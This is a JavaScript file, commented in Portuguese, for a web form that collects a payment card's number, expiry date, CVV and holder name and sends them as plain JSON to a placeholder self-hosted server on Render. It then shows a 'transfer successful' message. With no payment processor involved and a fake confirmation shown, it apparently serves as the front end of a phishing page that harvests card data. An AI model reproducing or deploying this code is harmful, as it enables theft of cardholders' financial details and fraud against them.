document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    
    // Mapeamento dos campos do teu HTML
    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // Função para remover as mensagens de dica
    function removeMensagemDica(input) {
        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
        if (dicaExistente) {
            dicaExistente.remove();
        }
    }

    // Configuração dos Focus e Blur (Dicas)
    for (const key in campos) {
        const input = campos[key];
        input.addEventListener("focus", () => {
            removeMensagemDica(input);
            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];
            input.parentElement.appendChild(dica);
        });
        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    // --- LÓGICA DE ENVIO E VALIDAÇÃO ---
    form.addEventListener("submit", async (event) => {
        event.preventDefault(); // Impede a página de recarregar

        // 1. VALIDAÇÃO: Verifica se algum campo está vazio
        if (
            campos.numero.value.trim() === "" ||
            campos.data.value.trim() === "" ||
            campos.cvv.value.trim() === "" ||
            campos.nome.value.trim() === ""
        ) {
            alert("Por favor, preencha todos os campos do cartão.");
            return; // Bloqueia o envio se faltar informação
        }

        // 2. Coleta o tipo de cartão (Crédito ou Débito)
        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não selecionado";

        // 3. Monta o objeto para o Banco de Dados
        const dadosParaEnviar = {
            numero: campos.numero.value,
            dataValidade: campos.data.value,
            cvv: campos.cvv.value,
            nome: campos.nome.value,
            tipo: cardType
        };

        // 4. Feedback visual no botão
        const botao = form.querySelector("button");
        botao.disabled = true;
        botao.textContent = "A processar...";

        try {
            // SUBSTITUA pelo seu link do Render
            const urlDoServidor = "https://SEU-PROJETO.onrender.com/enviar-dados";

            const resposta = await fetch(urlDoServidor, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(dadosParaEnviar)
            });

            if (resposta.ok) {
                alert("Transferência realizada com sucesso!");
                form.reset(); // Limpa o formulário após o sucesso
            } else {
                alert("Erro no servidor. Tente novamente mais tarde.");
            }
        } catch (error) {
            console.error("Erro ao conectar:", error);
            alert("Erro de conexão. Verifique se o servidor está online.");
        } finally {
            // Reativa o botão
            botao.disabled = false;
            botao.textContent = "Transferir";
        }
    });
});
